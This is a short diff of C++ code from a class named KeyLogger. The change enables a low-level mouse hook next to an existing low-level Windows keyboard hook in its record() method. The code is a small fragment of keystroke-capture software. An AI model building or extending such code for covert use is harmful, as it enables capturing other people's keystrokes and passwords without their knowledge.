@@ -135,7 +135,7 @@ VOID KeyLogger::record()
 {
 	std::cout << "Creating Hook" << '\n';
 	keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, NULL);
-	//mouseHook = SetWindowsHookEx(WH_MOUSE_LL, mouseProc, NULL, NULL);
+	mouseHook = SetWindowsHookEx(WH_MOUSE_LL, mouseProc, NULL, NULL);
 	//creating hooks can cause lag
 
 	std::cout << "Recording started" << '\n';
